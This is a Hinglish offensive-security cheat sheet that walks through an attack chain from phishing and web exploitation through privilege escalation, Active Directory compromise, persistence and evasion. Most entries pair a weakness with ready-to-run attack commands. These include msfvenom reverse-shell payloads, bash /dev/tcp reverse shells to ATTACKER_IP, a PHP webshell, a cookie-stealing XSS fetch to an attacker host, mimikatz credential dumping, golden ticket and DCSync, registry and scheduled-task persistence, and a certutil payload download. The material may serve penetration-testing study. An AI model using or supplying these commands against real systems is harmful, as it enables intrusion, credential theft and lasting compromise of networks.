01

Initial Access

Entry Point

Phishing

Vuln: Human trust — employee malicious attachment/link open kar deta hai.

Exploit karne ka tarika: GoPhish se campaign banao, macro-enabled document (payload embedded) bhejo, victim khole to reverse shell connect ho jaata hai apne listener pe.

msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o invoice.exe

Password Spraying

Vuln: Common/weak passwords multiple accounts pe reuse hote hain, lockout policy se bachne ke liye ek password sabpe try hota hai.

Exploit karne ka tarika: Valid usernames (OSINT se collect kiye) ke against ek common password (Summer2026!) try karo, lockout threshold se neeche rehke.

kerbrute passwordspray -d target.local users.txt 'Summer2026!'

Exposed/Default Services

Vuln: Internet-facing service default creds ya misconfiguration ke saath khula hai (RDP, FTP anonymous, exposed admin panel).

Exploit karne ka tarika: Shodan/Censys se exposed service dhundo, default creds try karo (admin:admin), ya anonymous access check karo.

ftp target_ip
# Username: anonymous, Password: (blank)
02

Web Application Attacks

Layer 7

SQL Injection

Vuln: User input directly SQL query mein concatenate hota hai, sanitize nahi hota.

Exploit karne ka tarika: Payload daal ke query logic todo, phir sqlmap se automate karke database dump karo (tables, creds).

sqlmap -u "http://target.com/item?id=1" --dbs --batch

File Upload Vulnerability

Vuln: Server file type properly validate nahi karta — extension check bypass ho sakta hai.

Exploit karne ka tarika: Webshell (PHP/ASPX) upload karo, extension trick karo (shell.php.jpg, double extension, content-type spoof), phir uploaded shell URL browse karke command execute karo.

<?php system($_GET['cmd']); ?>
# Upload karke: http://target.com/uploads/shell.php?cmd=whoami

Command Injection

Vuln: User input directly OS command mein pass hota hai bina sanitization ke.

Exploit karne ka tarika: Command chaining characters (; | &&) use karke apna command inject karo.

127.0.0.1; bash -i >&/dev/tcp/ATTACKER_IP/4444 0>&1

LFI/RFI (File Inclusion)

Vuln: File path parameter user-controlled hai, traversal filtered nahi hai.

Exploit karne ka tarika: Path traversal se sensitive files padho (/etc/passwd), ya log poisoning karke (User-Agent mein PHP code inject karke, phir log file include karke) code execution lo.

http://target.com/page?file=../../../../etc/passwd

XSS (Cross-Site Scripting)

Vuln: User input bina sanitize kiye page mein render hota hai.

Exploit karne ka tarika: Script inject karo jo victim ke browser mein chale — cookie steal karke session hijack karo.

<script>fetch('http://attacker/steal?c='+document.cookie)</script>

IDOR (Insecure Direct Object Reference)

Vuln: Object ID (user_id, order_id) directly URL/parameter mein hai, authorization check nahi hoti.

Exploit karne ka tarika: Apna ID kisi aur ke ID se replace karo, check karo unka data access ho raha hai ya nahi.

http://target.com/account?id=1001 → id=1002 try karo
03

Network Service Attacks

Infra Level

SMB Exploitation

Vuln: Purani SMB version (EternalBlue-type) ya null session allow karta hai.

Exploit karne ka tarika: Shares enumerate karo pehle, phir agar vulnerable version hai to public exploit run karo.

smbclient -L //target_ip/ -N
crackmapexec smb target_ip -u '' -p ''

SNMP Enumeration

Vuln: Default community string ("public"/"private") change nahi kiya gaya.

Exploit karne ka tarika: Default strings se query karo — system info, running processes, weak configs leak hote hain.

snmpwalk -c public -v1 target_ip

NFS Misconfiguration

Vuln: NFS share "no_root_squash" ke saath exported hai, ya kisi ko bhi mount allow karta hai.

Exploit karne ka tarika: Share mount karo, agar no_root_squash hai to SUID binary plant karke privesc karo.

showmount -e target_ip
mount -t nfs target_ip:/share /mnt/nfs
04

Linux Privilege Escalation

Post-Access

SUID Binary Abuse

Vuln: Ek binary root permissions ke saath SUID set hai, jo GTFOBins mein listed hai (privesc capable).

Exploit karne ka tarika: SUID binaries dhundo, GTFOBins pe check karo us binary ka exploit method.

find / -perm -4000 -type f 2>/dev/null
# Agar 'find' SUID hai:
find . -exec /bin/sh -p \; -quit

Sudo Misconfiguration

Vuln: User ko specific commands NOPASSWD ke saath sudo run karne diya gaya hai jo GTFOBins-exploitable hain.

Exploit karne ka tarika: sudo -l se check karo kya allowed hai, phir GTFOBins method use karo shell spawn karne ke liye.

sudo -l
# Agar vim allowed hai:
sudo vim -c ':!/bin/sh'

Cron Job Exploitation

Vuln: Root ke scheduled cron job ek script chalata hai jo world-writable hai.

Exploit karne ka tarika: Writable script mein apna reverse shell command inject karo, cron trigger hone ka wait karo — root shell milega.

cat /etc/crontab
echo "bash -i >&/dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/writable_script.sh

Kernel Exploits

Vuln: Kernel version purana hai, known local privesc CVE exist karta hai.

Exploit karne ka tarika: Kernel version check karo, matching public exploit dhundo, compile karke run karo.

uname -a
searchsploit linux kernel 5.4
05

Windows Privilege Escalation

Post-Access

Unquoted Service Path

Vuln: Service path spaces ke saath hai par quotes mein nahi hai (C:\Program Files\My App\service.exe).

Exploit karne ka tarika: Windows path ko folder-by-folder try karta hai — apna malicious exe us beech ke folder mein rakh do jo pehle match ho jaaye.

wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"

Weak Service Permissions

Vuln: Low-priv user ko service config modify karne ki permission hai.

Exploit karne ka tarika: Service binary path apne payload se replace karo, service restart hone pe SYSTEM-level execution milega.

accesschk.exe -uwcqv "User" *
sc config VulnSvc binpath= "C:\payload.exe"

AlwaysInstallElevated

Vuln: Registry policy set hai jo kisi bhi user ko MSI installer SYSTEM privileges se run karne deta hai.

Exploit karne ka tarika: Malicious MSI banao (msfvenom), run karo — directly SYSTEM shell milega.

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o payload.msi

Stored Credentials

Vuln: Passwords config files, registry, ya scheduled task mein plaintext/weak-encoded stored hain.

Exploit karne ka tarika: Common locations search karo (unattend.xml, web.config, registry autologon keys).

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

Token Impersonation (Potato Attacks)

Vuln: Service account ke paas SeImpersonatePrivilege hai (common misconfig).

Exploit karne ka tarika: PrintSpoofer/JuicyPotato tool se SYSTEM token impersonate karo.

PrintSpoofer.exe -i -c cmd
06

Active Directory Attacks

Domain-Level

Kerberoasting

Vuln: Service accounts (SPNs) ke paas weak passwords hote hain, kisi bhi domain user unka ticket request kar sakta hai.

Exploit karne ka tarika: Service ticket request karo (jo hash-encrypted hota hai), offline crack karo hashcat se.

GetUserSPNs.py target.local/user:pass -dc-ip DC_IP -request
hashcat -m 13100 hashes.txt rockyou.txt

ASREPRoasting

Vuln: User account ka "Kerberos pre-authentication" disabled hai.

Exploit karne ka tarika: Bina password ke us user ke liye AS-REP request karo, hash mil jaata hai, offline crack karo.

GetNPUsers.py target.local/ -usersfile users.txt -no-pass -dc-ip DC_IP

LLMNR/NBT-NS Poisoning

Vuln: Network mein legacy name resolution (LLMNR/NBT-NS) enabled hai — DNS fail hone par fallback hota hai.

Exploit karne ka tarika: Responder chalao, jab koi machine typo/wrong hostname query kare, tera machine "main hoon" bolke NTLM hash capture kar leta hai.

responder -I eth0

Pass-the-Hash

Vuln: NTLM authentication password hash accept karti hai, plaintext password zaroori nahi.

Exploit karne ka tarika: Kahin se NTLM hash mila (dump ya capture kiya) to use directly authentication ke liye use karo, crack karne ki zaroorat nahi.

crackmapexec smb target_ip -u administrator -H NTLM_HASH

BloodHound Attack Path Mapping

Vuln: Ye direct exploit nahi, par misconfigured permissions/trust relationships attack path banate hain.

Exploit karne ka tarika: Data collect karo (SharpHound), BloodHound GUI mein visualize karo — "shortest path to Domain Admin" dikhega.

SharpHound.exe -c All
07

Lateral Movement

Spread

Pass-the-Ticket

Vuln: Kerberos ticket memory se extract ho sakti hai, aur wapas inject karke reuse ho sakti hai.

Exploit karne ka tarika: Mimikatz se ticket dump karo, dusre session mein inject karo — bina password ke authenticate ho jaate ho.

mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt ticket.kirbi

PsExec / WMI / WinRM Execution

Vuln: Valid creds mil chuke hain (password ya hash), remote execution services enabled hain.

Exploit karne ka tarika: Tools use karke doosri machine pe directly command execute karo, valid creds ke through.

evil-winrm -i target_ip -u administrator -H NTLM_HASH
psexec.py target.local/administrator@target_ip
08

Domain Dominance

Full Compromise

Golden Ticket

Vuln: KRBTGT account ka password hash mil chuka hai (usually domain admin access ke baad).

Exploit karne ka tarika: KRBTGT hash se fully forged Kerberos ticket banao — jab tak KRBTGT reset na ho, unlimited domain access milta hai.

mimikatz # kerberos::golden /user:fake /domain:target.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

DCSync

Vuln: Compromised account ke paas Domain Controller replication rights hain (misconfig).

Exploit karne ka tarika: DC ko trick karke us se saare domain password hashes replicate/pull kar lo — poore domain ka database mil jaata hai.

secretsdump.py target.local/administrator@DC_IP

Persistence

Stay Access

Scheduled Task Persistence

Vuln: N/A — ye access maintain karne ka technique hai, exploit nahi.

Kaise karte hain: Ek scheduled task banao jo periodically apna payload wapas execute kare, taaki access loss hone pe bhi wapas mil jaaye.

schtasks /create /tn "Update" /tr "C:\payload.exe" /sc onlogon /ru SYSTEM

Registry Run Keys

Vuln: N/A — persistence technique.

Kaise karte hain: Registry mein apna payload path add karo jo har login pe automatically chale.

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "C:\payload.exe"

Credential Attacks

Universal

Brute-force / Password Cracking

Vuln: Weak passwords, ya offline captured hashes hain.

Exploit karne ka tarika: Wordlist-based attack chalao online service pe (hydra) ya offline hash pe (hashcat/john).

hydra -l admin -P rockyou.txt ssh://target_ip
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

Credential Dumping (Mimikatz)

Vuln: Local admin access mil chuka hai, LSASS memory mein plaintext/hashed creds hote hain.

Exploit karne ka tarika: Mimikatz se LSASS memory dump karke logged-in users ke credentials nikalo.

mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

Control

Kaise karte hain: Listener start karo attacker machine pe, target se payload trigger karo jo wapas connect kare.

# Attacker:
nc -lvnp 4444
# Target (agar command injection mila):
bash -i >&/dev/tcp/ATTACKER_IP/4444 0>&1

Evasion & Anti-Detection

Stealth

AMSI Bypass

Vuln: PowerShell scripts AMSI ke through scan hote hain — signature match hone pe block ho jaate hain.

Kaise karte hain: Memory mein AMSI scanning function patch/disable karo taaki script scan hi na ho.

Living off the Land (LOLBins)

Vuln: N/A — detection avoid karne ka tarika.

Kaise karte hain: Apna malicious tool upload karne ke bajaye, Windows ke apne built-in trusted binaries (certutil, mshta, regsvr32) abuse karo — AV inhe suspicious nahi maanta.

certutil -urlcache -split -f http://attacker/payload.exe payload.exe

Data Exfiltration Channels
